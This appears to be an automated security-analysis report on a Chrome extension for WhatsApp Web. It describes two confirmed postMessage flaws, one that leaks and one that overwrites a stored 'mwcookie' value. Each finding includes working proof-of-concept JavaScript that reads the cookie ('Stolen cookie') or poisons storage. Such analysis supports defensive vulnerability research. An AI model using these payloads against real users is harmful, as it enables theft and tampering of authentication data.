# CoCo Analysis: bjmdmhpgihlepnaokfbimcfnchdjepdl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bjmdmhpgihlepnaokfbimcfnchdjepdl/opgen_generated_files/cs_1.js
Line 418 var storage_local_get_source = {'key': 'value'};
Line 698 if (items && items['mwcookie']) {...}

**Code:**

```javascript
// Content script - cs_1.js (Lines 590-710)
function coreapi() {
    window.addEventListener('message', this.onCoreMsg); // ← attacker can send messages
}

coreapi.prototype.onCoreMsg = function (e) {
    try {
        window.coreapi.execute(e.data); // ← e.data is attacker-controlled
    } catch (e) {
        console.log(e)
    }
}

coreapi.prototype.execute = async function (e) {
    try {
        if (e.type == "req_cookie") {
            if (e.data.type == "get") {
                chrome.storage.local.get(["mwcookie"], function (items) {
                    let ck = null;
                    if (items && items['mwcookie']) {
                        ck = items['mwcookie']; // Stored sensitive data
                    }
                    window.postMessage({ type: '_wacore_cookie_', msg: ck }, '*'); // ← leaks to attacker
                });
            }

            if (e.data.type == "set") {
                chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {}); // ← storage poisoning
                window.postMessage({ type: '_wacore_cookie_', msg: e.data.cookie }, '*');
            }
        }
    } catch (e) {
        console.log(e)
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// On any webpage where content script runs (https://web.whatsapp.com/*)
// Attacker can read stored cookie
window.postMessage({
    type: "req_cookie",
    data: { type: "get" }
}, '*');

// Listen for response
window.addEventListener('message', function(event) {
    if (event.data.type === '_wacore_cookie_') {
        console.log('Stolen cookie:', event.data.msg); // Cookie leaked!
    }
});
```

**Impact:** Complete storage exploitation chain - attacker can both read (information disclosure) and poison (storage.set) the mwcookie value, which appears to be an authentication cookie for WhatsApp Web integration. The extension leaks stored sensitive data back to the attacker via window.postMessage.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bjmdmhpgihlepnaokfbimcfnchdjepdl/opgen_generated_files/cs_1.js
Line 601 coreapi.prototype.onCoreMsg = function (e)
Line 603 window.coreapi.execute(e.data);
Line 695 if (e.data.type == "get")
Line 707 chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {...}

**Code:**

```javascript
// Same flow as Sink 1 - Storage poisoning path
window.addEventListener('message', this.onCoreMsg); // ← entry point

coreapi.prototype.execute = async function (e) {
    if (e.type == "req_cookie") {
        if (e.data.type == "set") {
            chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () {}); // ← attacker poisons storage
        }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Poison the stored cookie
window.postMessage({
    type: "req_cookie",
    data: {
        type: "set",
        cookie: "malicious_cookie_value"
    }
}, '*');
```

**Impact:** Storage poisoning - attacker can inject arbitrary cookie values into chrome.storage.local, potentially hijacking the extension's authentication mechanism or causing denial of service by corrupting stored credentials.
